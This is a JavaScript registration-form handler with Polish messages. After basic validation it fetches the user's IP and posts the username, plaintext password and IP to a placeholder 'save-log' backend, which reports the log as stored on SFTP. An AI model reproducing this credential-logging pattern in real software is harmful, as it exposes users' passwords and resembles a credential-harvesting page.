document.getElementById('registrationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    const messageDiv = document.getElementById('message');
    const loadingDiv = document.getElementById('loading');
    
    messageDiv.style.display = 'none';
    
    if (password !== confirmPassword) {
        showMessage('Hasła nie są identyczne!', 'error');
        return;
    }
    
    if (username.length < 3) {
        showMessage('Nazwa użytkownika musi mieć co najmniej 3 znaki!', 'error');
        return;
    }
    
    if (password.length < 6) {
        showMessage('Hasło musi mieć co najmniej 6 znaków!', 'error');
        return;
    }
    
    loadingDiv.style.display = 'block';
    
    try {
        await registerUser(username, password);
    } catch (error) {
        console.error('Błąd rejestracji:', error);
        loadingDiv.style.display = 'none';
        showMessage('Błąd: ' + error.message, 'error');
    }
});

function showMessage(text, type) {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
}

async function registerUser(username, password) {
    const loadingDiv = document.getElementById('loading');
    
    try {
        let userIP = 'unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                userIP = ipData.ip;
            }
        } catch (ipError) {
            console.log('Nie udało się pobrać IP');
        }

        // Wysyłanie do backendu
        const response = await fetch('https://your-backend.herokuapp.com/save-log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password,
                ip: userIP
            })
        });

        const result = await response.json();
        console.log('Wynik z backendu:', result);

        loadingDiv.style.display = 'none';

        if (result.success) {
            showMessage('Rejestracja zakończona pomyślnie! Log został zapisany na SFTP.', 'success');
            document.getElementById('registrationForm').reset();
        } else {
            showMessage('Błąd SFTP: ' + result.error, 'error');
        }
        
    } catch (error) {
        console.error('Błąd rejestracji:', error);
        loadingDiv.style.display = 'none';
        showMessage('Błąd połączenia z serwerem.', 'error');
    }
}
